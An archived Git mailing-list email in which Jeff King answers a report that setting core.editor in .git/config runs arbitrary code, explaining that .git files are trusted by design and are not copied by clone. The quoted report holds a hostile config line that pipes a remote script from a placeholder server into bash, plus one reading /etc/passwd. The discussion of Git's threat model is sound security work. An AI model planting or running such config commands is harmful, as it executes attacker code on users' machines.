Return-Path: <git-owner@vger.kernel.org>
X-Spam-Checker-Version: SpamAssassin 3.4.1 (2015-04-28) on dcvr.yhbt.net
X-Spam-Level: 
X-Spam-ASN: AS31976 209.132.180.0/23
X-Spam-Status: No, score=-4.0 required=3.0 tests=AWL,BAYES_00,
	HEADER_FROM_DIFFERENT_DOMAINS,MAILING_LIST_MULTI,RCVD_IN_DNSWL_HI
	shortcircuit=no autolearn=ham autolearn_force=no version=3.4.1
Received: from vger.kernel.org (vger.kernel.org [209.132.180.67])
	by dcvr.yhbt.net (Postfix) with ESMTP id 482121F404
	for <e@80x24.org>; Sun, 26 Aug 2018 03:19:14 +0000 (UTC)
Received: (majordomo@vger.kernel.org) by vger.kernel.org via listexpand
        id S1726680AbeHZHAP (ORCPT <rfc822;e@80x24.org>);
        Sun, 26 Aug 2018 03:00:15 -0400
Received: from cloud.peff.net ([104.130.231.41]:56116 "HELO cloud.peff.net"
        rhost-flags-OK-OK-OK-OK) by vger.kernel.org with SMTP
        id S1726589AbeHZHAP (ORCPT <rfc822;git@vger.kernel.org>);
        Sun, 26 Aug 2018 03:00:15 -0400
Received: (qmail 25572 invoked by uid 109); 26 Aug 2018 03:19:13 -0000
Received: from Unknown (HELO peff.net) (10.0.1.2)
 by cloud.peff.net (qpsmtpd/0.94) with SMTP; Sun, 26 Aug 2018 03:19:13 +0000
Authentication-Results: cloud.peff.net; auth=none
Received: (qmail 7107 invoked by uid 111); 26 Aug 2018 03:19:19 -0000
Received: from sigill.intra.peff.net (HELO sigill.intra.peff.net) (10.0.0.7)
 by peff.net (qpsmtpd/0.94) with (ECDHE-RSA-AES256-GCM-SHA384 encrypted) SMTP; Sat, 25 Aug 2018 23:19:19 -0400
Authentication-Results: peff.net; auth=none
Received: by sigill.intra.peff.net (sSMTP sendmail emulation); Sat, 25 Aug 2018 23:19:10 -0400
Date:   Sat, 25 Aug 2018 23:19:10 -0400
From:   Jeff King <peff@peff.net>
To:     "Leo Silva (a.k.a kirotawa)" <kirotawa@gmail.com>
Cc:     git@vger.kernel.org
Subject: Re: Git vulnerability - execution of arbitrary code through .git/conf
Message-ID: <20180826031910.GA12286@sigill.intra.peff.net>
References: <CA+KS1kb7yVoG-j7p83--2+0Ry+iFg1YbEa9KzxqPTvNZTF5RHQ@mail.gmail.com>
MIME-Version: 1.0
Content-Type: text/plain; charset=utf-8
Content-Disposition: inline
In-Reply-To: <CA+KS1kb7yVoG-j7p83--2+0Ry+iFg1YbEa9KzxqPTvNZTF5RHQ@mail.gmail.com>
Sender: git-owner@vger.kernel.org
Precedence: bulk
List-ID: <git.vger.kernel.org>
X-Mailing-List: git@vger.kernel.org

On Sat, Aug 25, 2018 at 11:13:30PM -0300, Leo Silva (a.k.a kirotawa) wrote:

> Hi git community!
> 
> I found what seems to be a vulnerability/bug on git. I'm running
> version 2.7.4 on Ubuntu xenial, but also tested with last version
> 2.19.0.rc0.2.g29d9e3e.
> 
> The steps to reproduce are:
> 
> 1. open your .git/conf
> 2. add something like:
> [core]
>     editor = ls /etc/passwd
> or even
>     editor = curl -s http://server/path/malicious-script.sh | bash -s
> 3. run: git commit
>
> A malicious user/repo can set some code through URL or even as command
> in .git/conf and take control of your machine or silently run
> malicious code.

This is all working as designed. There are many ways you can execute
arbitrary code by changing files in in a .git directory. As you noticed,
core.editor is one. pager.* is another one, as are hooks in .git/hooks.

Our threat model is that the files in .git are trusted, and should be
protected through normal filesystem permissions. An important part of
that model is that a "git clone" does not copy arbitrary .git files from
the other side (only objects and refs). If you find a way around that,
it would be a problem (and in fact many of the vulnerabilities we've had
have involved somehow writing into .git from the checked-out tree).

-Peff
